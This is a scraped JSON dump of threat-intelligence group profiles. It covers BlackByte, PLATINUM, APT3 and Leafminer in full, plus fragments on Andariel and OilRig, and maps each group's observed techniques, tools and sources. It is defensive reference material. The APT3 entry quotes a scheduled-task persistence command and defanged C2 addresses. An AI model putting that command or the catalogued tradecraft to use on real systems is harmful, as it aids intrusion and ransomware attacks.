Targeted attacks by Andariel Threat Group, a subgroup of the Lazarus. Retrieved September 29, 2021. Chen, Joseph. (2018, July 16). New Andariel Reconnaissance Tactics Uncovered. Retrieved September 29, 2021. CrowdStrike. (2021, September 29). Silent Chollima Adversary Profile. Retrieved September 29, 2021. US Treasury . (2019, September 13). Treasury Sanctions North Korean State-Sponsored Malicious Cyber Groups. Retrieved September 29, 2021. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. Jazi, H. (2021, April 19). Lazarus APT conceals malicious code within BMP image to drop its RAT . Retrieved September 29, 2021. Park, S. (2021, June 15). Andariel evolves to target South Korea with ransomware. Retrieved September 29, 2021. "
},
{
"id": 131,
"title": "BlackByte, Hecamede, Group G1043",
"path": "/groups/G1043/index.html",
"content": " BlackByte BlackByte is a ransomware threat actor operating since at least 2021. BlackByte is associated with several versions of ransomware also labeled BlackByte Ransomware. BlackByte ransomware operations initially used a common encryption key allowing for the development of a universal decryptor, but subsequent versions such as BlackByte 2.0 Ransomware use more robust encryption mechanisms. BlackByte is notable for operations targeting critical infrastructure entities among other targets across North America.[1][2][3][4][5] ID: G1043 \u24d8 Associated Groups: Hecamede Contributors: Kaung Zaw Hein Version: 1.0 Created: 16 December 2024 Last Modified: 09 March 2025 Version Permalink Live Version Associated Group Descriptions Name Description Hecamede [3] Techniques Used Domain ID Name Use Enterprise T1134 .003 Access Token Manipulation: Make and Impersonate Token BlackByte constructed a valid authentication token following Microsoft Exchange exploitation to allow for follow-on privileged command execution.[4] Enterprise T1087 .002 Account Discovery: Domain Account BlackByte has used tools such as AdFind to identify and enumerate domain accounts.[4] Enterprise T1583 .003 Acquire Infrastructure: Virtual Private Server BlackByte staged encryption keys on virtual private servers operated by the adversary.[1] Enterprise T1071 .001 Application Layer Protocol: Web Protocols BlackByte collected victim device information then transmitted this via HTTP POST to command and control infrastructure.[4] Enterprise T1560 Archive Collected Data BlackByte compressed data collected from victim environments prior to exfiltration.[2] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder BlackByte has used Registry Run keys for persistence.[4] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell BlackByte used encoded PowerShell commands during operations.[1] BlackByte has used remote PowerShell commands in victim networks.[4] .003 Command and Scripting Interpreter: Windows Command Shell BlackByte executed ransomware using the Windows command shell.[1] Enterprise T1136 .002 Create Account: Domain Account BlackByte created privileged domain accounts during intrusions.[5] Enterprise T1543 .003 Create or Modify System Process: Windows Service BlackByte modified multiple services on victim machines to enable encryption operations.[3] BlackByte has installed tools such as AnyDesk as a service on victim machines.[4] Enterprise T1486 Data Encrypted for Impact BlackByte has encrypted victim files for ransom. Early versions of BlackByte ransomware used a common key for encryption, but later versions use unique keys per victim.[1][2][3][4][5] Enterprise T1491 .001 Defacement: Internal Defacement BlackByte left ransom notes in all directories where encryption takes place.[1] Enterprise T1140 Deobfuscate/Decode Files or Information BlackByte has encoded commands in base64-encoded sections concatenated together in PowerShell.[1] BlackByte uses PowerShell commands to disable Windows Defender.[2] Enterprise T1482 Domain Trust Discovery BlackByte enumerated Active Directory information and trust relationships during operations.[1][4] Enterprise T1480 Execution Guardrails BlackByte stopped execution if identified language settings on victim machines was Russian or one of several language associated with former Soviet republics.[2] BlackByte has used ransomware variants requiring a key passed on the command line for the malware to execute.[5] Enterprise T1041 Exfiltration Over C2 Channel BlackByte transmitted collected victim host information via HTTP POST to command and control infrastructure.[4] Enterprise T1567 Exfiltration Over Web Service BlackByte has used services such as anonymfiles.com and file.io to exfiltrate victim data.[2] Enterprise T1190 Exploit Public-Facing Application BlackByte exploited vulnerabilities such as ProxyLogon and ProxyShell for initial access to victim environments.[1][2][3][4] Enterprise T1068 Exploitation for Privilege Escalation BlackByte has exploited CVE-2024-37085 in VMWare ESXi software for authentication bypass and subsequent privilege escalation.[5] Enterprise T1562 Impair Defenses BlackByte removed Kernel Notify Routines to bypass endpoint detection and response (EDR) products.[3] .001 Disable or Modify Tools BlackByte disabled security tools such as Windows Defender and the Raccine anti-ransomware tool during operations.[1][2][5] .004 Disable or Modify System Firewall BlackByte modified firewall rules on victim machines to enable remote system discovery.[2][3] Enterprise T1070 .004 Indicator Removal: File Deletion BlackByte deleted ransomware executables post-encryption.[2][3][4][5] Enterprise T1105 Ingress Tool Transfer BlackByte has transferred tools such as Cobalt Strike to victim environments from file sharing and hosting websites.[4] Enterprise T1490 Inhibit System Recovery BlackByte resized and deleted volume shadow copy files to prevent system recovery after encryption.[2][3] Enterprise T1570 Lateral Tool Transfer BlackByte transfered tools such as Cobalt Strike and the AnyDesk remote access tool during operations using SMB shares.[2] Enterprise T1036 .008 Masquerading: Masquerade File Type BlackByte masqueraded configuration files containing encryption keys as PNG files.[1] Enterprise T1112 Modify Registry BlackByte performed Registry modifications to escalate privileges and disable security tools.[2][5] Enterprise T1046 Network Service Discovery BlackByte has used tools such as NetScan to enumerate network services in victim environments.[4] Enterprise T1135 Network Share Discovery BlackByte enumerated network shares on victim devices.[5] Enterprise T1003 OS Credential Dumping BlackByte used tools such as Cobalt Strike and Mimikatz to dump credentials from victim systems.[2][4] Enterprise T1055 Process Injection BlackByte has injected Cobalt Strike into wuauclt.exe during intrusions.[2] BlackByte has injected ransomware into svchost.exe before encryption.[3] .012 Process Hollowing BlackByte used process hollowing for defense evasion purposes.[4] Enterprise T1012 Query Registry BlackByte queried registry values to determine system language settings.[2] Enterprise T1219 Remote Access Tools BlackByte has used tools such as AnyDesk in victim environments.[2][4] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol BlackByte has used RDP to access other hosts within victim networks.[4][5] .002 Remote Services: SMB/Windows Admin Shares BlackByte used SMB file shares to distribute payloads throughout victim networks, including BlackByte ransomware variants during wormable operations.[2][4][5] Enterprise T1018 Remote System Discovery BlackByte used tools such as Arp to identify remotely-connected devices.[1][2] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task BlackByte created scheduled tasks for payload execution.[1][2] Enterprise T1505 .003 Server Software Component: Web Shell BlackByte has used ASPX web shells following exploitation of vulnerabilities in services such as Microsoft Exchange.[2][4] Enterprise T1518 .001 Software Discovery: Security Software Discovery BlackByte enumerated installed security products during operations.[4] Enterprise T1608 .001 Stage Capabilities: Upload Malware BlackByte has staged tools such as Cobalt Strike at public file sharing and hosting sites.[4] Enterprise T1082 System Information Discovery BlackByte used various system commands and tools to pull system information during operations.[1][3][4] Enterprise T1614 .001 System Location Discovery: System Language Discovery BlackByte identified system language settings to determine follow-on execution.[2] Enterprise T1016 System Network Configuration Discovery BlackByte used tools such as Arp to pull system network information and identify connected devices.[1][4] Enterprise T1569 .002 System Services: Service Execution BlackByte created malicious services for ransomware execution.[3][5] Enterprise T1078 Valid Accounts BlackByte has gained access to victim environments through legitimate VPN credentials.[5] .002 Domain Accounts BlackByte captured credentials for or impersonated domain administration users.[4][5] Enterprise T1047 Windows Management Instrumentation BlackByte used WMI to delete Volume Shadow Copies on victim machines.[1] Software ID Name References Techniques S0552 AdFind BlackByte used AdFind during operations.[3][4] Account Discovery: Domain Account, Domain Trust Discovery, Permission Groups Discovery: Domain Groups, Remote System Discovery, System Network Configuration Discovery S0099 Arp BlackByte used Arp to identify connected hosts in victim networks.[1] Remote System Discovery, System Network Configuration Discovery S1181 BlackByte 2.0 Ransomware BlackByte 2.0 Ransomware is ransomware uniquely associated with BlackByte operations and is a replacement for BlackByte Ransomware.[4] Data Encrypted for Impact, Exploitation for Privilege Escalation, Impair Defenses: Disable or Modify System Firewall, Indicator Removal: Timestomp, Indicator Removal: File Deletion, Inhibit System Recovery, Modify Registry, Network Share Discovery, Process Injection, Service Stop, System Services: Service Execution S1180 BlackByte Ransomware BlackByte Ransomware is ransomware uniquely associated with BlackByte operations prior to 2023.[4][6] Command and Scripting Interpreter: JavaScript, Data Encrypted for Impact, Deobfuscate/Decode Files or Information, Execution Guardrails, File and Directory Permissions Modification: Windows File and Directory Permissions Modification, Impair Defenses: Downgrade Attack, Impair Defenses: Disable or Modify Tools, Inhibit System Recovery, Lateral Tool Transfer, Modify Registry, Native API, Network Service Discovery, Network Share Discovery, Obfuscated Files or Information: Encrypted/Encoded File, Query Registry, Remote Services: SMB/Windows Admin Shares, Scheduled Task/Job: Scheduled Task, Software Discovery: Security Software Discovery, System Information Discovery, System Location Discovery: System Language Discovery, Virtualization/Sandbox Evasion: System Checks S0154 Cobalt Strike BlackByte has used Cobalt Strike as a post-exploitation tool.[2][4] Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Parent PID Spoofing, Access Token Manipulation: Token Impersonation/Theft, Access Token Manipulation: Make and Impersonate Token, Account Discovery: Domain Account, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, BITS Jobs, Browser Session Hijacking, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exploitation for Client Execution, Exploitation for Privilege Escalation, File and Directory Discovery, Hide Artifacts: Process Argument Spoofing, Impair Defenses: Disable or Modify Tools, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information, Office Application Startup: Office Template Macros, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: Domain Fronting, Proxy: Internal Proxy, Query Registry, Reflective Code Loading, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: Windows Remote Management, Remote Services: SMB/Windows Admin Shares, Remote Services: Distributed Component Object Model, Remote System Discovery, Scheduled Transfer, Screen Capture, Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Use Alternate Authentication Material: Pass the Hash, Valid Accounts: Domain Accounts, Valid Accounts: Local Accounts, Windows Management Instrumentation S1179 Exbyte BlackByte used Exbyte for automated file collection and exfiltration.[3][4] Deobfuscate/Decode Files or Information, Execution Guardrails, Exfiltration Over Web Service, File and Directory Discovery, Indicator Removal: File Deletion, Native API, Permission Groups Discovery: Local Groups, Software Discovery: Security Software Discovery, Virtualization/Sandbox Evasion: System Checks S0002 Mimikatz BlackByte has used Mimikatz for credential dumping during operations.[4] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0029 PsExec BlackByte has used PsExec to remotely execute payloads during wormable ransomware execution.[4] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution References US Federal Bureau of Investigation & US Secret Service. (2022, February 11). Indicators of Compromise Associated with BlackByte Ransomware. Retrieved December 16, 2024. Huseyin Can Yuceel. (2022, February 21). TTPs used by BlackByte Ransomware Targeting Critical Infrastructure. Retrieved December 16, 2024. Symantec Threat Hunter Team. (2022, October 21). Exbyte: BlackByte Ransomware Attackers Deploy New Exfiltration Tool. Retrieved December 16, 2024. Microsoft Incident Response. (2023, July 6). The five-day job: A BlackByte ransomware intrusion case study. Retrieved December 16, 2024. James Nutland, Craig Jackson, Terryn Valikodath, & Brennan Evans. (2024, August 28). BlackByte blends tried-and-true tradecraft with newly disclosed vulnerabilities to support ongoing attacks. Retrieved December 16, 2024. Rodel Mendrez & Lloyd Macrohon. (2021, October 15). BlackByte Ransomware \u2013 Pt. 1 In-depth Analysis. Retrieved December 16, 2024. "
},
{
"id": 132,
"title": "PLATINUM, Group G0068",
"path": "/groups/G0068/index.html",
"content": " PLATINUM PLATINUM is an activity group that has targeted victims since at least 2009. The group has focused on targets associated with governments and related organizations in South and Southeast Asia. [1] ID: G0068 Contributors: Ryan Becwar Version: 1.3 Created: 18 April 2018 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1189 Drive-by Compromise PLATINUM has sometimes used drive-by attacks against vulnerable browser plugins.[1] Enterprise T1068 Exploitation for Privilege Escalation PLATINUM has leveraged a zero-day vulnerability to escalate privileges.[1] Enterprise T1105 Ingress Tool Transfer PLATINUM has transferred files using the Intel\u00ae Active Management Technology (AMT) Serial-over-LAN (SOL) channel.[2] Enterprise T1056 .001 Input Capture: Keylogging PLATINUM has used several different keyloggers.[1] .004 Input Capture: Credential API Hooking PLATINUM is capable of using Windows hook interfaces for information gathering such as credential access.[1] Enterprise T1036 Masquerading PLATINUM has renamed rar.exe to avoid detection.[3] Enterprise T1095 Non-Application Layer Protocol PLATINUM has used the Intel\u00ae Active Management Technology (AMT) Serial-over-LAN (SOL) channel for command and control.[2] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory PLATINUM has used keyloggers that are also capable of dumping credentials.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment PLATINUM has sent spearphishing emails with attachments to victims as its primary initial access vector.[1] Enterprise T1055 Process Injection PLATINUM has used various methods of process injection including hot patching.[1] Enterprise T1204 .002 User Execution: Malicious File PLATINUM has attempted to get users to open malicious files by sending spearphishing emails with attachments to victims.[1] Software ID Name References Techniques S0202 adbupd [1] Command and Scripting Interpreter: Windows Command Shell, Encrypted Channel: Asymmetric Cryptography, Event Triggered Execution: Windows Management Instrumentation Event Subscription S0200 Dipsind [1] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Winlogon Helper DLL, Command and Scripting Interpreter: Windows Command Shell, Data Encoding: Standard Encoding, Encrypted Channel: Symmetric Cryptography, Ingress Tool Transfer, Scheduled Transfer S0201 JPIN [1] Application Layer Protocol: Mail Protocols, Application Layer Protocol: File Transfer Protocols, BITS Jobs, Command and Scripting Interpreter: Windows Command Shell, File and Directory Discovery, File and Directory Permissions Modification: Windows File and Directory Permissions Modification, Impair Defenses: Disable or Modify Tools, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Obfuscated Files or Information, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection, Query Registry, Software Discovery: Security Software Discovery, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Service Discovery References Windows Defender Advanced Threat Hunting Team. (2016, April 29). PLATINUM: Targeted attacks in South and Southeast Asia. Retrieved February 15, 2018. Kaplan, D, et al. (2017, June 7). PLATINUM continues to evolve, find ways to maintain invisibility. Retrieved February 19, 2018. Carr, N.. (2018, October 25). Nick Carr Status Update. Retrieved September 12, 2024. "
},
{
"id": 133,
"title": "APT3, Gothic Panda, Pirpi, UPS Team, Buckeye, Threat Group-0110, TG-0110, Group G0022",
"path": "/groups/G0022/index.html",
"content": " APT3 APT3 is a China-based threat group that researchers have attributed to China's Ministry of State Security.[1][2] This group is responsible for the campaigns known as Operation Clandestine Fox, Operation Clandestine Wolf, and Operation Double Tap.[1][3] As of June 2015, the group appears to have shifted from targeting primarily US victims to primarily political organizations in Hong Kong.[4] ID: G0022 \u24d8 Associated Groups: Gothic Panda, Pirpi, UPS Team, Buckeye, Threat Group-0110, TG-0110 Contributors: Patrick Sungbahadoor Version: 1.4 Created: 31 May 2017 Last Modified: 16 September 2024 Version Permalink Live Version Associated Group Descriptions Name Description Gothic Panda [5] [2] [4] Pirpi [5] UPS Team [1] [2] [4] Buckeye [4] Threat Group-0110 [2] [4] TG-0110 [2] [4] Techniques Used Domain ID Name Use Enterprise T1087 .001 Account Discovery: Local Account APT3 has used a tool that can obtain info about local and global group users, power users, and administrators.[4] Enterprise T1098 .007 Account Manipulation: Additional Local or Domain Groups APT3 has been known to add created accounts to local admin groups to maintain elevated access.[6] Enterprise T1560 .001 Archive Collected Data: Archive via Utility APT3 has used tools to compress data before exfilling it.[6] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder APT3 places scripts in the startup folder for persistence.[3] Enterprise T1110 .002 Brute Force: Password Cracking APT3 has been known to brute force password hashes to be able to leverage plain text credentials.[7] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell APT3 has used PowerShell on victim systems to download and run payloads after exploitation.[3] .003 Command and Scripting Interpreter: Windows Command Shell An APT3 downloader uses the Windows command \"cmd.exe\" /C whoami. The group also uses a tool to execute commands on remote computers.[3][4] Enterprise T1136 .001 Create Account: Local Account APT3 has been known to create or enable accounts, such as support_388945a0.[6] Enterprise T1543 .003 Create or Modify System Process: Windows Service APT3 has a tool that creates a new service for persistence.[3] Enterprise T1555 .003 Credentials from Password Stores: Credentials from Web Browsers APT3 has used tools to dump passwords from browsers.[4] Enterprise T1005 Data from Local System APT3 will identify Microsoft Office documents on the victim's computer.[6] Enterprise T1074 .001 Data Staged: Local Data Staging APT3 has been known to stage files for exfiltration in a single location.[6] Enterprise T1546 .008 Event Triggered Execution: Accessibility Features APT3 replaces the Sticky Keys binary C:\\Windows\\System32\\sethc.exe for persistence.[6] Enterprise T1041 Exfiltration Over C2 Channel APT3 has a tool that exfiltrates data over the C2 channel.[8] Enterprise T1203 Exploitation for Client Execution APT3 has exploited the Adobe Flash Player vulnerability CVE-2015-3113 and Internet Explorer vulnerability CVE-2014-1776.[1][8] Enterprise T1083 File and Directory Discovery APT3 has a tool that looks for files and directories on the local file system.[8][9] Enterprise T1564 .003 Hide Artifacts: Hidden Window APT3 has been known to use -WindowStyle Hidden to conceal PowerShell windows.[3] Enterprise T1574 .001 Hijack Execution Flow: DLL APT3 has been known to side load DLLs with a valid version of Chrome with one of their tools.[8][10] Enterprise T1070 .004 Indicator Removal: File Deletion APT3 has a tool that can delete files.[8] Enterprise T1105 Ingress Tool Transfer APT3 has a tool that can copy files to remote machines.[8] Enterprise T1056 .001 Input Capture: Keylogging APT3 has used a keylogging tool that records keystrokes in encrypted files.[4] Enterprise T1036 .010 Masquerading: Masquerade Account Name APT3 has been known to create or enable accounts, such as support_388945a0.[6] Enterprise T1104 Multi-Stage Channels An APT3 downloader first establishes a SOCKS5 connection to 192.157.198[.]103 using TCP port 1913; once the server response is verified, it then requests a connection to 192.184.60[.]229 on TCP port 81.[3] Enterprise T1095 Non-Application Layer Protocol An APT3 downloader establishes SOCKS5 connections for its initial C2.[3] Enterprise T1027 Obfuscated Files or Information APT3 obfuscates files or information to help evade defensive measures.[4] .002 Software Packing APT3 has been known to pack their tools.[7][1] .005 Indicator Removal from Tools APT3 has been known to remove indicators of compromise from tools.[7] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory APT3 has used a tool to dump credentials by injecting itself into lsass.exe and triggering with the argument \"dig.\"[4] Enterprise T1069 Permission Groups Discovery APT3 has a tool that can enumerate the permissions associated with Windows groups.[4] Enterprise T1566 .002 Phishing: Spearphishing Link APT3 has sent spearphishing emails containing malicious links.[1] Enterprise T1057 Process Discovery APT3 has a tool that can list out currently running processes.[8][9] Enterprise T1090 .002 Proxy: External Proxy An APT3 downloader establishes SOCKS5 connections for its initial C2.[3] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol APT3 enables the Remote Desktop Protocol for persistence.[6] APT3 has also interacted with compromised systems to browse and copy files through RDP sessions.[11] .002 Remote Services: SMB/Windows Admin Shares APT3 will copy files over to Windows Admin Shares (like ADMIN$) as part of lateral movement.[4] Enterprise T1018 Remote System Discovery APT3 has a tool that can detect the existence of remote systems.[4][8] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task An APT3 downloader creates persistence by creating the following scheduled task: schtasks /create /tn \"mysc\" /tr C:\\Users\\Public\\test.exe /sc ONLOGON /ru \"System\".[3] Enterprise T1218 .011 System Binary Proxy Execution: Rundll32 APT3 has a tool that can run DLLs.[8] Enterprise T1082 System Information Discovery APT3 has a tool that can obtain information about the local system.[4][9] Enterprise T1016 System Network Configuration Discovery A keylogging tool used by APT3 gathers network information from the victim, including the MAC address, IP address, WINS, DHCP server, and gateway.[4][9] Enterprise T1049 System Network Connections Discovery APT3 has a tool that can enumerate current network connections.[4][8][9] Enterprise T1033 System Owner/User Discovery An APT3 downloader uses the Windows command \"cmd.exe\" /C whoami to verify that it is running with the elevated privileges of \"System.\"[3] Enterprise T1552 .001 Unsecured Credentials: Credentials In Files APT3 has a tool that can locate credentials in files on the file system such as those from Firefox or Chrome.[4] Enterprise T1204 .001 User Execution: Malicious Link APT3 has lured victims into clicking malicious links delivered through spearphishing.[1] Enterprise T1078 .002 Valid Accounts: Domain Accounts APT3 leverages valid accounts after gaining credentials for use within the victim domain.[4] Software ID Name References Techniques S0349 LaZagne [4] Credentials from Password Stores: Windows Credential Manager, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores, Credentials from Password Stores: Keychain, OS Credential Dumping: LSA Secrets, OS Credential Dumping: /etc/passwd and /etc/shadow, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Cached Domain Credentials, OS Credential Dumping: Proc Filesystem, Unsecured Credentials: Credentials In Files S0165 OSInfo [4] Account Discovery: Local Account, Account Discovery: Domain Account, Network Share Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Query Registry, Remote System Discovery, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery S0013 PlugX [10] Application Layer Protocol: Web Protocols, Application Layer Protocol: DNS, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Hijack Execution Flow: DLL, Impair Defenses: Disable or Modify System Firewall, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Masquerade Task or Service, Masquerading: Match Legitimate Resource Name or Location, Modify Registry, Native API, Network Share Discovery, Non-Application Layer Protocol, Non-Standard Port, Obfuscated Files or Information, Process Discovery, Query Registry, Screen Capture, System Network Connections Discovery, Trusted Developer Utilities Proxy Execution: MSBuild, Virtualization/Sandbox Evasion: System Checks, Web Service: Dead Drop Resolver S0166 RemoteCMD [4] Ingress Tool Transfer, Scheduled Task/Job: Scheduled Task, System Services: Service Execution S0111 schtasks [3] Scheduled Task/Job: Scheduled Task S0063 SHOTPUT [1] Account Discovery: Local Account, File and Directory Discovery, Obfuscated Files or Information, Process Discovery, Remote System Discovery, System Network Connections Discovery References Eng, E., Caselden, D.. (2015, June 23). Operation Clandestine Wolf \u2013 Adobe Flash Zero-Day in APT3 Phishing Campaign. Retrieved January 14, 2016. Insikt Group (Recorded Future). (2017, May 17). Recorded Future Research Concludes Chinese Ministry of State Security Behind APT3. Retrieved September 16, 2024. Moran, N., et al. (2014, November 21). Operation Double Tap. Retrieved January 14, 2016. Symantec Security Response. (2016, September 6). Buckeye cyberespionage group shifts gaze from US to Hong Kong. Retrieved September 26, 2016. Lancaster, T. (2015, July 25). A tale of Pirpi, Scanbox & CVE-2015-3113. Retrieved March 30, 2016. valsmith. (2012, September 21). More on APTSim. Retrieved September 28, 2017. Korban, C, et al. (2017, September). APT3 Adversary Emulation Plan. Retrieved January 16, 2018. Chen, X., Scott, M., Caselden, D.. (2014, April 26). New Zero-Day Exploit targeting Internet Explorer Versions 9 through 11 Identified in Targeted Attacks. Retrieved January 14, 2016. Yates, M. (2017, June 18). APT3 Uncovered: The code evolution of Pirpi. Retrieved September 28, 2017. Scott, M.. (2014, June 10). Clandestine Fox, Part Deux. Retrieved January 14, 2016. Glyer, C. (2018, April 14). @cglyer Status Update. Retrieved September 12, 2024. "
},
{
"id": 134,
"title": "Leafminer, Raspite, Group G0077",
"path": "/groups/G0077/index.html",
"content": " Leafminer Leafminer is an Iranian threat group that has targeted government organizations and business entities in the Middle East since at least early 2017. [1] ID: G0077 \u24d8 Associated Groups: Raspite Version: 2.4 Created: 17 October 2018 Last Modified: 16 April 2025 Version Permalink Live Version Associated Group Descriptions Name Description Raspite [2] Techniques Used Domain ID Name Use Enterprise T1110 .003 Brute Force: Password Spraying Leafminer used a tool called Total SMB BruteForcer to perform internal password spraying.[1] Enterprise T1059 .007 Command and Scripting Interpreter: JavaScript Leafminer infected victims using JavaScript code.[1] Enterprise T1136 .001 Create Account: Local Account Leafminer used a tool called Imecab to set up a persistent remote access account on the victim machine.[1] Enterprise T1555 Credentials from Password Stores Leafminer used several tools for retrieving login and password information, including LaZagne.[1] .003 Credentials from Web Browsers Leafminer used several tools for retrieving login and password information, including LaZagne.[1] Enterprise T1189 Drive-by Compromise Leafminer has infected victims using watering holes.[1] Enterprise T1114 .002 Email Collection: Remote Email Collection Leafminer used a tool called MailSniper to search through the Exchange server mailboxes for keywords.[1] Enterprise T1083 File and Directory Discovery Leafminer used a tool called MailSniper to search for files on the desktop and another utility called Sobolsoft to extract attachments from EML files.[1] Enterprise T1046 Network Service Discovery Leafminer scanned network services to search for vulnerabilities in the victim system.[1] Enterprise T1027 .010 Obfuscated Files or Information: Command Obfuscation Leafminer obfuscated scripts that were used on victim machines.[1] Enterprise T1588 .002 Obtain Capabilities: Tool Leafminer has obtained and used tools such as LaZagne, Mimikatz, PsExec, and MailSniper.[1] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory Leafminer used several tools for retrieving login and password information, including LaZagne and Mimikatz.[1] .004 OS Credential Dumping: LSA Secrets Leafminer used several tools for retrieving login and password information, including LaZagne.[1] .005 OS Credential Dumping: Cached Domain Credentials Leafminer used several tools for retrieving login and password information, including LaZagne.[1] Enterprise T1055 .013 Process Injection: Process Doppelg\u00e4nging Leafminer has used Process Doppelg\u00e4nging to evade security software while deploying tools on compromised systems.[1] Enterprise T1018 Remote System Discovery Leafminer used Microsoft\u2019s Sysinternals tools to gather detailed information about remote systems.[1] Enterprise T1552 .001 Unsecured Credentials: Credentials In Files Leafminer used several tools for retrieving login and password information, including LaZagne.[1] Software ID Name References Techniques S0349 LaZagne [1] Credentials from Password Stores: Windows Credential Manager, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores, Credentials from Password Stores: Keychain, OS Credential Dumping: LSA Secrets, OS Credential Dumping: /etc/passwd and /etc/shadow, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Cached Domain Credentials, OS Credential Dumping: Proc Filesystem, Unsecured Credentials: Credentials In Files S0413 MailSniper [1] Account Discovery: Email Account, Brute Force: Password Spraying, Email Collection: Remote Email Collection S0002 Mimikatz [1] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0029 PsExec [1] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution References Symantec Security Response. (2018, July 25). Leafminer: New Espionage Campaigns Targeting Middle Eastern Regions. Retrieved August 28, 2018. Dragos, Inc. (2018, August 2). RASPITE. Retrieved November 26, 2018. "
},
{
"id": 135,
"title": "OilRig, COBALT GYPSY, IRN2, APT34, Helix Kitten, Evasive Serpens, Hazel Sandstorm, EUROPIUM, ITG13, Earth Simnavaz, Crambus, TA452, Group G0049",
"path": "/groups/G0049/index.html",
"content": " OilRig OilRig is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecommunications. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. The group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests.[1][2][3][4][5][6][7] ID: G0049 \u24d8 Associated Groups: COBALT GYPSY, IRN2, APT34, Helix Kitten, Evasive Serpens, Hazel Sandstorm, EUROPIUM, ITG13, Earth Simnavaz, Crambus, TA452 Contributors: Robert Falcone; Bryan Lee; Dragos Threat Intelligence; Jaesang Oh, KC7 Foundation Version: 5.0 Created: 14 December 2017 Last Modified: 16 January 2025 Version Permalink Live Version Associated Group Descriptions Name Description COBALT GYPSY [8] IRN2 [9] APT34 This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.[7][1][10] Helix Kitten [7][9] Evasive Serpens [6] Hazel Sandstorm [11] EUROPIUM [11] ITG13 [12] Earth Simnavaz [13] Crambus [14] TA452 [15] Campaigns ID Name First Seen Last Seen References Techniques C0044 Juicy Mix January 2022 [16] December 2022 [16] [16] Application Layer Protocol: Web Protocols, Browser 